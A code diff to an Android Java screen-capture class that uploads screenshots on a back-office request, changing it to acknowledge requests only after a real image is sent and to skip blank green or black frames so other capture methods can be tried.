@@ -151,9 +151,13 @@ public final class ScreenCapture {
         }
 
         JSONObject res = postJson(body);
-        CapturePrefs.setLastCaptureAt(app, System.currentTimeMillis());
-        if (requestAt > 0) CapturePrefs.setLastAckRequestAt(app, requestAt);
         boolean hasImages = res != null && res.optBoolean("hasImages", false);
+        // Ack only when a real image landed — empty/fail reports must leave captureRequestAt
+        // pending so heartbeat retries (otherwise BO「สั่งแคปจอ」dies forever).
+        if (hasImages) {
+            CapturePrefs.setLastCaptureAt(app, System.currentTimeMillis());
+            if (requestAt > 0) CapturePrefs.setLastAckRequestAt(app, requestAt);
+        }
         String shotId = res != null ? res.optString("shotId", "") : "";
         String urlHint =
                 res != null && res.optString("primaryUrl", "").length() > 8
@@ -190,7 +194,8 @@ public final class ScreenCapture {
                             + " · "
                             + (primary != null ? primary.detail : "")
                             + " · "
-                            + (secondary != null ? secondary.detail : ""));
+                            + (secondary != null ? secondary.detail : "")
+                            + " · จะลองใหม่");
         }
     }
 
@@ -254,16 +259,18 @@ public final class ScreenCapture {
     }
 
     /**
-     * Encode only real UI frames. Reject near-uniform brand-green placeholders so BO never
-     * mistakes a synthetic status card for a live screen.
+     * Encode only real UI frames. Reject near-uniform brand-green / black placeholders.
+     * Returns {@code null} (not a fail shot) so callers can try the next strategy —
+     * e.g. MediaProjection black first-frame → PixelCopy / draw_decor.
      */
     private static CaptureShot acceptRealFrame(Bitmap bmp, String detail) {
         if (bmp == null) return null;
         if (isMostlyBrandGreen(bmp)) {
             bmp.recycle();
-            return CaptureShot.fail("reject_uniform_green");
+            return null;
         }
         CaptureShot shot = encode(bmp);
+        if (shot == null || !shot.ok) return null;
         if (detail != null && !detail.isEmpty()) shot.detail = detail;
         return shot;
     }
